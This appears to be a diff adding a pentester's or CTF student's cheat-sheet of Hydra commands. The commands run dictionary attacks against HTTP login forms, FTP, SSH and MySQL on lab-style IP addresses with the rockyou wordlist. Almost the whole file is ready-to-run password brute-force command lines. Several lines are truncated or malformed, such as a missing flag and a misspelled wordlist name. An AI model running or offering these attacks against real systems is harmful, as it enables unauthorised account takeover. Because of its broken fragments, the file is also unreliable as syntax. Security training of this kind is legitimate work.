@@ -1,0 +1,22 @@
+http-post-form://10.200.7.232:80/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect
+	
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.157 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad Credentials" -V
+
+hydra -L user.lst -P password.list 192.168.0.108 http-post-form "/admin/login-php:username=^USER^&password=^PASS^&loginsubmit=Submit:incorrect" -V -I
+
+hydra -l matt -P /usr/share/wordlists/rockyou.txt 192.168.0.24 ftp -e nsr
+
+action=authenticate:username=^USER^&password=^PASS^:Bad Credentials" 
+
+http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
+
+"/admin/login-php:username=^USER^&password=^PASS^:Incorrect Username" -V -I -t 64
+
+^PASS^&submit=Login:Password"
+
+insidetrust.blogspot.com/2011/08using-hydra-to-dictionary-attack-web-html
+
+ssh://ip -s puerto
+up ssh -s puerto--------------esta mejor
+
+hydra -l root P rockyoy mysql
